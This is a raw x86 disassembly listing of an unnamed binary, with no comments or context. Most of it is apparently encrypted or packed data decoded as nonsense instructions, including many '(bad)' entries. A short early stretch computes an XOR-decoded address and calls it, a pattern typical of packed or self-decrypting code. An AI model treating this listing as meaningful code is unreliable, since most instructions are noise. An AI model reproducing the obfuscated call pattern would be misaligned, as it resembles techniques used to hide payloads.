  40cb64:	not    BYTE PTR [esi]
  40cb66:	dec    esi
  40cb67:	cmp    ch,BYTE PTR [ecx+0x4e]
  40cb6a:	jne    0x40cb03
  40cb6c:	sub    al,0xdd
  40cb6e:	and    al,0x59
  40cb70:	push   ebx
  40cb71:	push   0x4f89913d
  40cb76:	mov    ebx,0xc905abc3
  40cb7b:	in     al,dx
  40cb7c:	das    
  40cb7d:	adc    DWORD PTR [eax-0x214fcdd4],esi
  40cb83:	es jmp 0x9b90:0x754c2f95
  40cb8b:	fs pusha 
  40cb8d:	dec    edi
  40cb8e:	add    edx,eax
  40cb90:	ffreep st(0)
  40cb92:	lods   eax,DWORD PTR ds:[esi]
  40cb93:	adc    cl,BYTE PTR [edi+0xfc603c3]
  40cb99:	scas   eax,DWORD PTR es:[edi]
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x25]
  40cbfc:	push   0xf
  40cbfe:	pop    eax
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc6f
  40cc08:	int    0x3
  40cc0a:	pusha  
  40cc0b:	out    dx,eax
  40cc0c:	cmp    eax,0xf3344933
  40cc11:	ins    DWORD PTR es:[edi],dx
  40cc12:	xchg   ebp,eax
  40cc13:	loope  0x40cc4f
  40cc15:	jle    0x40cbf5
  40cc17:	pop    ebp
  40cc18:	cmc    
  40cc19:	adc    ebx,DWORD PTR [edx+0x55]
  40cc1c:	push   edi
  40cc1d:	in     eax,dx
  40cc1e:	int    0x13
  40cc20:	add    DWORD PTR ds:0x4e80db3d,0x32a10d03
  40cc2a:	pop    ecx
  40cc2b:	fsubr  st(1),st
  40cc2d:	mov    BYTE PTR [ecx+edi*4],al
  40cc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc31:	test   BYTE PTR gs:[ebx-0x6f],dl
  40cc35:	jl     0x40cc92
  40cc37:	repz sahf 
  40cc39:	test   eax,0xe42f237d
  40cc3e:	js     0x40cc65
  40cc40:	pop    ebx
  40cc41:	ret    
  40cc42:	cmp    bh,BYTE PTR [ecx]
  40cc44:	and    al,0x7a
  40cc46:	inc    eax
  40cc47:	mov    ch,0x32
  40cc49:	cli    
  40cc4a:	sub    dh,BYTE PTR [ebp+0x13]
  40cc4d:	div    BYTE PTR [edx+0xa1d2f3c]
  40cc53:	or     eax,0xf09474e
  40cc58:	xchg   ch,bh
  40cc5a:	test   eax,esp
  40cc5c:	cmc    
  40cc5d:	imul   edi,edx,0x2e9fb5e9
  40cc63:	cmp    ecx,ecx
  40cc65:	enter  0x722e,0xfc
  40cc69:	imul   ecx,ebp,0xc7469474
  40cc6f:	fiadd  WORD PTR [ebp+0x40]
  40cc72:	ins    DWORD PTR es:[edi],dx
  40cc73:	sub    eax,0x76f92ce
  40cc78:	loop   0x40cc29
  40cc7a:	inc    edx
  40cc7b:	mov    ecx,0x1f408c2c
  40cc80:	out    dx,eax
  40cc81:	leave  
  40cc82:	(bad)  
  40cc83:	adc    ebp,ebx
  40cc85:	mov    WORD PTR [ebp+0xe958905],cs
  40cc8b:	dec    edx
  40cc8c:	pop    esi
  40cc8d:	and    al,0xca
  40cc8f:	jg     0x40ccb2
  40cc91:	aas    
  40cc92:	or     bl,ah
  40cc94:	aad    0x20
  40cc96:	cmp    BYTE PTR [ebx-0x14ea47e],0xc3
  40cc9d:	in     eax,dx
  40cc9e:	int    0x3a
  40cca0:	inc    edi
  40cca1:	jo     0x40ccd8
  40cca3:	in     eax,0x8d
  40cca5:	adc    BYTE PTR [esi+ebx*8+0x2352513c],bl
  40ccac:	gs xor al,0xdf
  40ccaf:	mov    edi,DWORD PTR [edi+ecx*4+0x17]
  40ccb3:	and    eax,0x51fcb0c9
  40ccb8:	in     al,dx
  40ccb9:	mov    al,0x15
  40ccbb:	xor    bh,dh
  40ccbd:	adc    al,0xa3
  40ccbf:	in     eax,0xb0
  40ccc1:	test   BYTE PTR [edi],bl
  40ccc3:	add    BYTE PTR [edi+0x31362219],0xd
  40ccca:	ins    DWORD PTR es:[edi],dx
  40cccb:	mov    ebp,0xb3cd18e2
  40ccd0:	icebp  
  40ccd1:	leave  
  40ccd2:	std    
  40ccd3:	mov    dl,0xe
  40ccd5:	popa   
  40ccd6:	jg     0x40cd09
  40ccd8:	and    eax,0xf666ba6e
  40ccdd:	lods   al,BYTE PTR ds:[esi]
  40ccde:	xchg   esp,eax
  40ccdf:	sar    cl,cl
  40cce1:	push   esp
  40cce2:	pop    esi
  40cce3:	jae    0x40cd50
  40cce5:	test   al,0x2d
  40cce7:	clc    
  40cce8:	or     dh,ch
  40ccea:	or     al,0x43
  40ccec:	dec    edx
  40cced:	mov    bl,0x32
  40ccef:	pop    esi
  40ccf0:	cmp    BYTE PTR [edx+0x28198901],ah
  40ccf6:	dec    ebp
  40ccf7:	in     al,dx
  40ccf8:	xor    al,0x3
  40ccfa:	inc    esi
  40ccfb:	retf   0x2e19
  40ccfe:	daa    
  40ccff:	and    DWORD PTR [ecx-0x67],ebx
  40cd02:	retf   0x8ee7
  40cd05:	aad    0x3
  40cd07:	iret   
  40cd08:	fidiv  DWORD PTR [esi]
  40cd0a:	sahf   
  40cd0b:	cli    
  40cd0c:	or     DWORD PTR [ecx-0x64],ebx
  40cd0f:	add    al,0xf5
  40cd11:	je     0x40cc9d
  40cd13:	shl    ebp,1
  40cd15:	mov    dl,0x19
  40cd17:	mov    bl,0x74
  40cd19:	inc    ebp
  40cd1a:	sbb    BYTE PTR [eax+0x1c372e04],ch
  40cd20:	xchg   ebp,eax
  40cd21:	in     eax,dx
  40cd22:	lds    esi,FWORD PTR [ebp-0x67]
  40cd25:	out    dx,eax
  40cd26:	iret   
  40cd27:	fisttp QWORD PTR [eax+0x67957104]
  40cd2d:	or     al,0xe4
  40cd2f:	add    al,0x18
  40cd31:	sbb    edx,DWORD PTR [esp+edx*4]
  40cd34:	fistp  DWORD PTR [ebx]
  40cd36:	lods   eax,DWORD PTR ds:[esi]
  40cd37:	and    esi,edi
  40cd39:	sar    bl,1
  40cd3b:	cmovno eax,ecx
  40cd3e:	call   0x6d29:0x85634a85
  40cd45:	(bad)  
  40cd46:	les    ebx,FWORD PTR [edi-0x7c]
  40cd49:	or     BYTE PTR [edx+0x37],al
  40cd4c:	out    dx,eax
  40cd4d:	cdq    
  40cd4e:	xchg   edi,eax
  40cd4f:	add    ecx,DWORD PTR [ecx-0x50]
  40cd52:	(bad)  
  40cd53:	xor    al,0x18
  40cd55:	rcl    BYTE PTR [eax-0x6],0xe1
  40cd59:	push   ds
  40cd5a:	jo     0x40cd1a
  40cd5c:	sub    esi,0x0
  40cd5f:	sar    DWORD PTR [eax],0xb
  40cd62:	cdq    
  40cd63:	mov    cl,dl
  40cd65:	mov    esp,0x7fdcf825
  40cd6a:	ins    BYTE PTR es:[edi],dx
  40cd6b:	sub    al,0x64
  40cd6d:	fistp  DWORD PTR [eax+0x6f61517d]
  40cd73:	in     eax,0x42
  40cd75:	repnz scas eax,DWORD PTR es:[edi]
  40cd77:	dec    esp
  40cd78:	loop   0x40cd27
  40cd7a:	pop    es
  40cd7b:	int3   
  40cd7c:	je     0x40cd2c
  40cd7e:	sbb    eax,0x8465a703
  40cd83:	dec    ebp
  40cd84:	or     BYTE PTR [eax-0x328b5095],bh
  40cd8a:	cmp    al,0x33
  40cd8c:	mov    ebp,0x13b5390e
  40cd91:	enter  0xcfe3,0x95
  40cd95:	repz ja 0x40cdc7
  40cd98:	sub    eax,0x74191098
  40cd9d:	ins    DWORD PTR es:[edi],dx
  40cd9e:	inc    edi
  40cd9f:	test   DWORD PTR [eax+0x2d75177e],0x121226a8
  40cda9:	push   ds
  40cdaa:	dec    eax
  40cdab:	pusha  
  40cdac:	mov    WORD PTR [ebx-0x5d2e29c0],gs
  40cdb2:	fs fcmovb st,st(4)
  40cdb5:	push   ebx
  40cdb6:	repnz out dx,al
  40cdb8:	pop    esp
  40cdb9:	addr16 in al,dx
  40cdbb:	test   DWORD PTR [eax-0x30],ebp
  40cdbe:	pop    edx
  40cdbf:	push   es
  40cdc0:	inc    esi
  40cdc1:	mov    ebx,0x365f9aa3
  40cdc6:	sbb    eax,0xe643d38c
  40cdcb:	mov    dl,0x93
  40cdcd:	scas   al,BYTE PTR es:[edi]
  40cdce:	dec    ebx
  40cdcf:	push   ds
  40cdd0:	mov    eax,0xaf27eb67
  40cdd5:	push   ecx
  40cdd6:	sub    esp,DWORD PTR [edi+ebx*8]
  40cdd9:	mov    dl,0x60
  40cddb:	ret    
  40cddc:	iret   
  40cddd:	loop   0x40cda8
  40cddf:	sahf   
  40cde0:	push   es
  40cde1:	mov    ss,WORD PTR [edi+0x47d187e7]
  40cde7:	xor    DWORD PTR [ebx+0x6],0xffffff9a
  40cdeb:	pop    esi
  40cdec:	out    0x50,eax
  40cdee:	(bad)  
  40cdef:	adc    al,0x41
  40cdf1:	mov    ebx,0x76ffd91
  40cdf6:	fimul  WORD PTR ss:[eax-0x657d4b4f]
  40cdfd:	sbb    BYTE PTR [eax-0x6f],ah
  40ce00:	mov    BYTE PTR [edi-0x6b],dl
  40ce03:	(bad)  
  40ce05:	sbb    eax,0xccb78372
  40ce0a:	(bad)  [edx-0x78]
  40ce0d:	push   ds
  40ce0e:	cmp    eax,0xcce7fa6
  40ce13:	and    BYTE PTR [edx+0x12a2e5bc],0xe4
  40ce1a:	mov    ah,0x7e
  40ce1c:	es fwait
  40ce1e:	jl     0x40ce82
  40ce20:	cmp    eax,0x2a21f0ff
  40ce25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce26:	lahf   
  40ce27:	into   
  40ce28:	mov    edi,0xe220ada0
  40ce2d:	xor    edx,0x46
  40ce30:	cwde   
  40ce31:	adc    BYTE PTR [edi-0x6baf4e94],bl
  40ce37:	pcmpeqd mm2,QWORD PTR [edi]
  40ce3a:	mov    esp,0x11f80755
  40ce3f:	data16 jg 0x40ce1c
  40ce42:	jae    0x40ce6b
  40ce44:	(bad)  
  40ce45:	neg    BYTE PTR [ecx+0x77]
  40ce48:	aad    0x65
  40ce4a:	xor    edx,edi
  40ce4c:	push   es
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	cs in  eax,0xe9
  40ce65:	jecxz  0x40ce93
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	pop    ebp
  40ce6f:	xchg   ebp,eax
  40ce70:	pusha  
  40ce71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce72:	test   al,0xd7
  40ce74:	or     BYTE PTR [edi],cl
  40ce76:	lods   al,BYTE PTR ds:[esi]
  40ce77:	stos   DWORD PTR es:[edi],eax
  40ce78:	fstp   QWORD PTR [ebx-0x10]
  40ce7b:	push   ss
  40ce7c:	push   ebx
  40ce7d:	inc    ebp
  40ce7e:	push   ss
  40ce7f:	pop    esp
  40ce80:	ret    0x640e
  40ce83:	jecxz  0x40ce5e
  40ce85:	cmp    al,0x4a
  40ce87:	xchg   ebp,eax
  40ce88:	mov    edi,0x7e788974
  40ce8d:	pop    eax
  40ce8e:	xchg   edi,eax
  40ce8f:	add    BYTE PTR [ebx+edi*8-0x27],bl
  40ce93:	iret   
  40ce94:	test   BYTE PTR [ecx],bh
  40ce96:	(bad)  
  40ce97:	repz (bad) 
  40ce99:	je     0x40cec8
  40ce9b:	push   esi
  40ce9c:	ror    DWORD PTR [ecx+0x5e3b1f6d],0xca
  40cea3:	bound  ebp,QWORD PTR [eax+0x71]
  40cea6:	mov    edi,0x45f2af2d
  40ceab:	daa    
  40ceac:	pop    ds
  40cead:	mov    ds:0x17efebc5,al
  40ceb2:	popf   
  40ceb3:	xor    ebx,DWORD PTR cs:[esi+0x4]
  40ceb7:	bswap  ebx
  40ceb9:	dec    eax
  40ceba:	pushfw 
  40cebc:	jmp    0xe23f5c11
  40cec1:	ins    DWORD PTR es:[edi],dx
  40cec2:	or     bl,al
  40cec4:	adc    eax,edx
  40cec6:	mov    esp,DWORD PTR [esi]
  40cec8:	jp     0x40cee3
  40ceca:	sub    BYTE PTR [ebp-0x1df43d48],cl
  40ced0:	fld    st(6)
  40ced2:	or     al,0xcf
  40ced4:	pop    es
  40ced5:	add    al,BYTE PTR ds:0x68ff452
  40cedb:	add    al,0xc3
  40cedd:	inc    esp
  40cede:	pushf  
  40cedf:	jmp    0xb667536f
  40cee4:	xchg   edi,eax
  40cee5:	mov    bl,0x96
  40cee7:	dec    edx
  40cee8:	jmp    0x40ceb1
  40ceea:	mov    ebp,0x6f18866a
  40ceef:	add    BYTE PTR [eax+0x4906bb7e],0x8c
  40cef6:	gs jns 0x40cf45
  40cef9:	inc    ecx
  40cefa:	mov    dl,0x6d
  40cefc:	loope  0x40cecb
  40cefe:	xchg   ecx,eax
  40ceff:	prefetch BYTE PTR [edx]
  40cf02:	out    0x22,eax
  40cf04:	es adc eax,ebx
  40cf07:	in     eax,0xbb
  40cf09:	sbb    al,0xce
  40cf0b:	lock inc ebx
  40cf0d:	ins    BYTE PTR es:[edi],dx
  40cf0e:	fs (bad) 
  40cf10:	mov    ds:0x65f11360,al
  40cf15:	cmp    al,0xfe
  40cf17:	mov    ecx,0x3d7ca2ed
  40cf1c:	test   bl,ch
  40cf1e:	mov    al,ds:0xd69df830
  40cf23:	and    al,0x2b
  40cf25:	int3   
  40cf26:	cmp    DWORD PTR [ebx],edi
  40cf28:	lods   eax,DWORD PTR ds:[esi]
  40cf29:	cmp    al,0xb6
  40cf2b:	mov    cl,0xeb
  40cf2d:	push   ebp
  40cf2e:	out    dx,al
  40cf2f:	mov    eax,0xbd0f75e2
  40cf34:	and    al,0x48
  40cf36:	cmp    eax,0xe86a281b
  40cf3b:	retf   
  40cf3c:	jne    0x40cf4e
  40cf3e:	mov    ebp,0x49548cca
  40cf43:	xchg   edi,eax
  40cf44:	xchg   BYTE PTR [ecx-0x30],cl
  40cf47:	dec    ebx
  40cf48:	xchg   DWORD PTR [ebp-0x6f],edx
  40cf4b:	addr16 inc esp
  40cf4d:	sub    DWORD PTR [edi],esi
  40cf4f:	call   0xd959ac28
  40cf54:	add    DWORD PTR [esi+0x1f],edx
  40cf57:	sub    esp,DWORD PTR ss:[ebx]
  40cf5a:	adc    BYTE PTR [eax-0x5b],cl
  40cf5d:	or     esi,ebp
  40cf5f:	jne    0x40cfd9
  40cf61:	push   ebp
  40cf62:	retf   
  40cf63:	and    ebp,DWORD PTR [ebp-0x79]
  40cf66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf67:	mov    ecx,0x2ff4ec55
  40cf6c:	and    dh,cl
  40cf6e:	lods   eax,DWORD PTR ds:[esi]
  40cf6f:	fwait
  40cf70:	es stc 
  40cf72:	retf   
  40cf73:	pushf  
  40cf74:	arpl   WORD PTR [ecx+eax*2+0x1a],bx
  40cf78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf79:	inc    ebx
  40cf7a:	jge    0x40cfd4
  40cf7c:	mov    DWORD PTR ds:0xb9f37580,esp
  40cf82:	xor    al,0x3
  40cf84:	rcr    esp,1
  40cf86:	sub    DWORD PTR [ebx-0x39],eax
  40cf89:	adc    al,0x66
  40cf8b:	scas   eax,DWORD PTR es:[edi]
  40cf8c:	or     al,BYTE PTR [ebp+0x5f8d3d36]
  40cf92:	jmp    0xae1dee27
  40cf97:	xor    DWORD PTR [ebp+0x6e],ecx
  40cf9a:	mov    WORD PTR [esi-0x3a456f1f],ds
  40cfa0:	mov    dl,0x3a
  40cfa2:	pop    es
  40cfa3:	sbb    dl,al
  40cfa5:	enter  0x3195,0x8e
  40cfa9:	sub    al,0xf3
  40cfab:	loop   0x40cfdb
  40cfad:	test   DWORD PTR [ecx+0x3b],esi
  40cfb0:	dec    ecx
  40cfb1:	cli    
  40cfb2:	(bad)  
  40cfb3:	repnz into 
  40cfb5:	dec    BYTE PTR [edx+0x8]
  40cfb8:	call   0xaf82f97c
  40cfbd:	out    dx,eax
  40cfbe:	sub    al,BYTE PTR [esi]
  40cfc0:	mov    al,0x44
  40cfc2:	pop    ebp
  40cfc3:	xchg   edx,eax
  40cfc4:	lods   al,BYTE PTR ds:[esi]
  40cfc5:	mov    ecx,0x2a988462
  40cfca:	mov    ds:0x17e055ba,al
  40cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd0:	cli    
  40cfd1:	loope  0x40cfb4
  40cfd3:	cs dec ecx
  40cfd5:	cmp    DWORD PTR [eax+0x3e461ddb],esp
  40cfdb:	sbb    DWORD PTR [edx+0x3c0aa986],ecx
  40cfe1:	clc    
  40cfe2:	ds jle 0x40cfb9
  40cfe5:	xor    BYTE PTR [edx+0x66bffaa7],0xa0
  40cfec:	mov    esi,0xc9a00603
  40cff1:	and    DWORD PTR [edi+edx*4],eax
  40cff4:	inc    ebp
  40cff5:	cmp    ah,bl
  40cff7:	cmp    eax,esp
  40cff9:	mov    edx,0x94c5da3c
  40cffe:	pop    DWORD PTR [edx-0x16ec1657]
  40d004:	std    
  40d005:	(bad)  
  40d006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d007:	lods   al,BYTE PTR ds:[esi]
  40d008:	pushf  
  40d009:	fdiv   QWORD PTR [edi+ebp*4]
  40d00c:	mov    ch,0xb
  40d00e:	jg     0x40cfbc
  40d010:	mov    bh,BYTE PTR [ebx+0x3b]
  40d013:	jo     0x40cfa3
  40d015:	rcr    bl,cl
  40d017:	hlt    
  40d018:	imul   ebx,DWORD PTR [edx-0x6f],0xffffff99
  40d01c:	stos   BYTE PTR es:[edi],al
  40d01d:	test   DWORD PTR [edx+0x2b3d7ac9],ecx
  40d023:	add    eax,0x4d342e2c
  40d028:	cmp    ch,0x5d
  40d02b:	inc    edi
  40d02c:	in     eax,dx
  40d02d:	inc    edx
  40d02e:	xor    BYTE PTR [edx-0x327e321c],cl
  40d034:	cmovle esp,esi
  40d037:	push   ds
  40d038:	dec    ecx
  40d039:	mov    al,0xb9
  40d03b:	pop    ebx
  40d03c:	push   0x9f427e2b
  40d041:	pop    ds
  40d042:	jecxz  0x40cfc8
  40d044:	dec    edi
  40d045:	sub    eax,0x7c5eefb5
  40d04a:	adc    BYTE PTR [edx-0x766e8456],ch
  40d050:	test   al,0x87
  40d052:	pop    edx
  40d053:	sub    eax,0x3bca4bcc
  40d058:	jo     0x40d040
  40d05a:	sbb    al,0x3f
  40d05c:	daa    
  40d05d:	push   ss
  40d05e:	or     ebp,eax
  40d060:	xor    al,0x2d
  40d062:	aam    0x29
  40d064:	and    bl,bl
  40d066:	int3   
  40d067:	add    BYTE PTR [esi+0x203a9cc3],cl
  40d06d:	mov    edi,esp
  40d06f:	cmp    eax,0xe0f52456
  40d074:	sbb    esi,DWORD PTR [ebx+0x50f01107]
  40d07a:	push   0x46
  40d07c:	stos   BYTE PTR es:[edi],al
  40d07d:	pop    es
  40d07e:	jbe    0x40d0d9
  40d080:	fsubr  QWORD PTR [ebx]
  40d082:	das    
  40d083:	in     al,0x9
  40d085:	lahf   
  40d086:	xchg   edx,eax
  40d087:	mov    ds:0x17b3e829,eax
  40d08c:	(bad)  
  40d08d:	jl     0x40d08a
  40d08f:	cdq    
  40d090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d091:	jmp    0x40d10b
  40d093:	jle    0x40d102
  40d095:	and    al,0x90
  40d097:	mov    bh,0x89
  40d099:	jg     0x40d112
  40d09b:	jbe    0x40d0cb
  40d09d:	repnz test ebx,edx
  40d0a0:	rcr    DWORD PTR [edi+0x3fa9575e],1
  40d0a6:	fs dec ebp
  40d0a8:	mov    ebx,0x1ba4a98c
  40d0ad:	in     eax,0x77
  40d0af:	inc    ebp
  40d0b0:	adc    al,0xa5
  40d0b2:	sbb    DWORD PTR [edx-0x1bba74b7],0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d0:	das    
  40d0d1:	or     esi,DWORD PTR [ebx]
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d12e
  40d0dc:	into   
  40d0dd:	xor    eax,0x2ea9dcfe
  40d0e2:	popf   
  40d0e3:	xor    ah,BYTE PTR [ebp+eiz*4-0x40]
  40d0e7:	das    
  40d0e8:	cmp    DWORD PTR [edx],edi
  40d0ea:	mov    eax,0x1ecae972
  40d0ef:	inc    esp
  40d0f0:	ret    
  40d0f1:	sbb    ecx,edx
  40d0f3:	pop    ds
  40d0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0f5:	push   cs
  40d0f6:	mov    dl,0xeb
  40d0f8:	inc    ebp
  40d0f9:	cmp    DWORD PTR ds:0x16f1dc4c,eax
  40d0ff:	into   
  40d100:	pop    es
  40d101:	add    BYTE PTR [eax-0x558a39b6],bl
  40d107:	fld    TBYTE PTR [esi]
  40d109:	lods   eax,DWORD PTR ds:[esi]
  40d10a:	inc    esi
  40d10b:	test   eax,0x6956b3d5
  40d110:	and    DWORD PTR [eax],esp
  40d112:	add    DWORD PTR [ebx-0x3c849e6e],esp
  40d118:	dec    esp
  40d119:	adc    BYTE PTR [eax+ebx*8],0x43
  40d11d:	dec    edx
  40d11e:	and    DWORD PTR [esi+0x2ad3c741],edi
  40d124:	mov    esp,0xfeaad8a0
  40d129:	out    0xf9,al
  40d12b:	mov    cl,0xbf
  40d12d:	call   0x14c5:0x35eef34
  40d134:	add    DWORD PTR [esi+0x54],ebx
  40d137:	sub    ch,bh
  40d139:	rcl    BYTE PTR [ecx+0x68],cl
  40d13c:	push   ecx
  40d13d:	data16 repz adc BYTE PTR [esi+0xb],0x14
  40d143:	sub    DWORD PTR [edi],edi
  40d145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d146:	xchg   edi,eax
  40d147:	ds cs (bad) 
  40d14a:	fsubr  QWORD PTR [ecx+0x7e]
  40d14d:	cdq    
  40d14e:	dec    ebx
  40d14f:	cmc    
  40d150:	jge    0x40d12f
  40d152:	cmp    bl,ch
  40d154:	lea    ebp,[edx+0x3c]
  40d157:	or     ebp,esi
  40d159:	dec    eax
  40d15a:	mov    bl,0x37
  40d15c:	push   ebx
  40d15d:	ins    DWORD PTR es:[edi],dx
  40d15e:	js     0x40d110
  40d160:	adc    al,dh
  40d162:	or     DWORD PTR [edx],0x1494410c
  40d168:	mov    ?,WORD PTR [eax]
  40d16a:	push   ebp
  40d16b:	xor    ebx,edi
  40d16d:	scas   al,BYTE PTR es:[edi]
  40d16e:	les    ecx,FWORD PTR [edx-0x1f]
  40d171:	or     edx,DWORD PTR [ebx+0x2]
  40d174:	fisub  WORD PTR es:[ebx]
  40d177:	or     edi,DWORD PTR [edi-0x6e77fecf]
  40d17d:	fcomp  QWORD PTR [edx]
  40d17f:	or     al,0x25
  40d181:	lods   eax,DWORD PTR ds:[esi]
  40d182:	sub    ebx,esi
  40d184:	add    ebp,edi
  40d186:	out    0x30,eax
  40d188:	retf   
  40d189:	inc    edx
  40d18a:	outs   dx,BYTE PTR ds:[esi]
  40d18b:	xor    DWORD PTR [edi+0x70],eax
  40d18e:	out    dx,al
  40d18f:	stos   BYTE PTR es:[edi],al
  40d190:	or     DWORD PTR [edx+ebx*2-0x6f],0xb58d783b
  40d198:	xchg   esp,eax
  40d199:	test   DWORD PTR [edx],0x10b210e8
  40d19f:	div    DWORD PTR [eax]
  40d1a1:	int3   
  40d1a2:	loopne 0x40d21a
  40d1a4:	sbb    eax,0xed9a0302
  40d1a9:	xor    ch,BYTE PTR [edx]
  40d1ab:	ds jp  0x40d185
  40d1ae:	fcomp  QWORD PTR [edx+0xedd1816]
  40d1b4:	or     bh,BYTE PTR [edi+0x1a42d5a8]
  40d1ba:	out    dx,eax
  40d1bb:	das    
  40d1bc:	fldcw  WORD PTR [edx-0x46]
  40d1bf:	sbb    al,0xdf
  40d1c1:	cmc    
  40d1c2:	and    eax,DWORD PTR [ebx-0x21]
  40d1c5:	and    bh,BYTE PTR [ebx+0x27f257ad]
  40d1cb:	call   0xbe45:0x24e2c7da
  40d1d2:	ret    
  40d1d3:	jns    0x40d219
  40d1d5:	push   ebp
  40d1d6:	cs sub cl,ch
  40d1d9:	add    al,0x40
  40d1db:	xor    eax,DWORD PTR [edi-0x58]
  40d1de:	push   cs
  40d1df:	push   ebx
  40d1e0:	mov    ds:0x1240665d,al
  40d1e5:	cmp    al,dh
  40d1e7:	jl     0x40d1ee
  40d1e9:	out    dx,eax
  40d1ea:	fsubr  DWORD PTR [ecx]
  40d1ec:	sub    bh,BYTE PTR [ecx-0x7b]
  40d1ef:	mov    ebx,0x87edfc1d
  40d1f4:	push   esi
  40d1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f6:	bound  esp,QWORD PTR [eax]
  40d1f8:	inc    esi
  40d1f9:	mov    al,0x34
  40d1fb:	mov    cl,BYTE PTR [ebp-0x5c]
  40d1fe:	or     DWORD PTR [ebp+0x38],edx
  40d201:	popa   
  40d202:	ret    0x2285
  40d205:	jp     0x40d273
  40d207:	mov    esi,ebx
  40d209:	loop   0x40d1ea
  40d20b:	sbb    DWORD PTR [ecx],ebx
  40d20d:	or     DWORD PTR [ebx],ebp
  40d20f:	(bad)  
  40d210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d211:	fsubr  DWORD PTR [ebp-0x2f1ccc63]
  40d217:	mov    ecx,0xaf4e9505
  40d21c:	icebp  
  40d21d:	mov    ch,0x59
  40d21f:	mov    WORD PTR [ebx],ss
  40d221:	mov    eax,ds:0xc13ff004
  40d226:	push   esi
  40d227:	loop   0x40d1aa
  40d229:	xor    edx,DWORD PTR [edx]
  40d22b:	sub    eax,DWORD PTR [edx]
  40d22d:	mov    fs,edx
  40d22f:	fnstsw WORD PTR [edx+0x7d]
  40d232:	adc    esp,DWORD PTR [ebp+0x4389411e]
  40d238:	daa    
  40d239:	mov    al,0x1f
  40d23b:	pop    edx
  40d23c:	xchg   esp,eax
  40d23d:	sti    
  40d23e:	fwait
  40d23f:	mov    ah,0xfb
  40d241:	ret    0x9d07
  40d244:	outs   dx,BYTE PTR ds:[esi]
  40d245:	lods   eax,DWORD PTR ds:[esi]
  40d246:	cdq    
  40d247:	add    ecx,DWORD PTR [ecx]
  40d249:	push   0x7209e586
  40d24e:	push   es
  40d24f:	in     al,0x5b
  40d251:	hlt    
  40d252:	push   0x68
  40d254:	aaa    
  40d255:	retf   0xff3d
  40d258:	arpl   WORD PTR [ebx],si
  40d25a:	lock jl 0x9fd3be5a
  40d261:	popw   ds
  40d263:	jns    0x40d201
  40d265:	adc    eax,0xab21a34f
  40d26a:	in     al,0x48
  40d26c:	inc    edx
  40d26d:	int    0x99
  40d26f:	adc    cl,dh
  40d271:	or     edx,DWORD PTR [edx+0x2fa26621]
  40d277:	inc    edi
  40d278:	ds push ss
  40d27a:	pop    esi
  40d27b:	sub    ebp,DWORD PTR [esi+0x72]
  40d27e:	jl     0x40d262
  40d280:	retf   
  40d281:	mov    edi,0x66e37c5e
  40d286:	popf   
  40d287:	sbb    al,0xe7
  40d289:	cs daa 
  40d28b:	test   BYTE PTR [esp+ecx*2+0x6840dece],ch
  40d292:	(bad)  
  40d293:	(bad)  
  40d294:	fsub   QWORD PTR [edi]
  40d296:	sbb    bl,bl
  40d298:	enter  0xa4e,0x9a
  40d29c:	xchg   esi,eax
  40d29d:	adc    DWORD PTR [ecx-0x3],ebp
  40d2a0:	in     al,dx
  40d2a1:	addr16 dec edx
  40d2a3:	mov    al,0x6a
  40d2a5:	fucomi st,st(4)
  40d2a7:	in     al,dx
  40d2a8:	or     DWORD PTR [eax-0x80],edx
